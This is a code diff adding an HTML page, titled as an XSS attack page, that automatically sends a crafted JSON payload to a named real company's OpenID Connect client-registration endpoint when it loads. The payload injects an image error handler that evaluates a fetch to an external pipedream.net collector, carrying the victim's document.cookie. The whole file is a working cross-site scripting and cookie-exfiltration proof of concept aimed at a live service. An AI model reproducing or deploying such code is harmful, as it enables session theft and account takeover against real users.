@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Attack Page</title>
+</head>
+<body>
+    <h1>Welcome to the XSS Attack Page</h1>
+    <p>The attack will trigger automatically as soon as this page loads.</p>
+
+    <script>
+        // Crafting the exact JSON payload as needed for the attack
+        const payload = "{\"<img onerror=\\\"eval('fetch(\\\\\'https://eoly8ch5cxgt867.m.pipedream.net?cookie=\\\\\' + document.cookie)')\\\")\\\" src/>\":1\"a\":\"da\"}";
+
+        // Function to send the POST request automatically when the page loads
+        function sendPayload() {
+            fetch('https://shop.ifood.com.br/auth/realms/ifood/clients-registrations/openid-connect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                    'User-Agent': navigator.userAgent,
+                    'Origin': location.origin,
+                },
+                body: payload
+            })
+            .then(response => {
+                console.log('POST request sent successfully');
+                // Optionally, log the response or do something with it
+            })
+            .catch(error => {
+                console.error('Error sending POST request:', error);
+            });
+        }
+
+        // Call sendPayload() when the page loads
+        window.onload = sendPayload;
+    </script>
+</body>
+</html>
